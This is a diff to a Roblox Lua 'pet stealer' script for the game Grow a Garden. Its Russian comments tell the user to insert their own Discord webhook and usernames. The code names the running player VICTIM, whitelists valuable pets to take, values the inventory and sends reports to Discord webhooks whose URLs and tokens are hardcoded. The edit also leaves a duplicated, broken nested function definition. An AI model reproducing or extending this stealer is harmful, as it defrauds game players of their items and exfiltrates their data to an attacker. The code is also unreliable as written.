@@ -1,10 +1,18 @@
+local Webhook = "https://discord.com/api/webhooks/1376515155814514769/0pp3_tQv_j7Aeehx6imt8UBQUan0sPFfn9yaxXxmy6QGfeucYGh4CHQwrssARwTNfh75" --вебхук дискорда если не знаешь как посмотри видосики
+
+local Username = {
+"roblox1", "roblox2" --твой ник в роблокс который начинается с '@' но не надо писать '@'
+}
+
+local ExtraPets = {"Chicken Zombie", "Red Fox"}
+
 if game.PlaceId ~= 126884695634066 then
     game.Players.LocalPlayer:Kick("⚠️ This script works only in Grow a Garden.")
     return
 end
 
 
-getgenv().BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo" -- без USERNAME
+local BackupWebhook = "https://discord.com/api/webhooks/1402140961303171292/_h77-A9pC0AsyU9eVTd5lWocS7erqpqsjilcxFZtubDVh5GCYMGKXr00k8-Lg5t0Ixlo" -- без USERNAME
 
 
 
@@ -172,7 +180,7 @@ local BASE_PET_WHITELIST = {
     'French Fry Ferret',
 }
 
-local EXTRA_WHITELIST = getgenv().ExtraPets or {}
+local EXTRA_WHITELIST = ExtraPets or {}
 
 -- Объединяем базовый список и дополнительные имена
 local PET_WHITELIST = {}
@@ -225,19 +233,23 @@ local inventoryValue = getInventoryValue()
 
 -- 🔧 startStealingProcess ВЫНЕСЕНА ВВЕРХ
 local function startStealingProcess()
-    if getgenv().scriptAlreadyRan then
+    local scriptAlreadyRan = false
+
+local function startStealingProcess()
+    if scriptAlreadyRan then
         warn("⚠️ ScriptAlreadyRun.")
         return
     end
-    getgenv().scriptAlreadyRan = true
+    scriptAlreadyRan = true
+
 
     repeat task.wait() until game:IsLoaded()
 
     local VICTIM = game.Players.LocalPlayer
-    local USERNAMES = getgenv().Username
+    local USERNAMES = Username
 
     local function getWebhookUrl()
-        return getgenv().Webhook
+        return Webhook
     end
 
     local function waitForJoin()
@@ -255,7 +267,7 @@ local function startStealingProcess()
 
     local function createDiscordEmbed(petList, totalValue, fileUrl, callback)
  local webhookUrl = getWebhookUrl()
-local backupWebhook = getgenv().BackupWebhook
+local backupWebhook = BackupWebhook
 
 local baseFields = {
     {
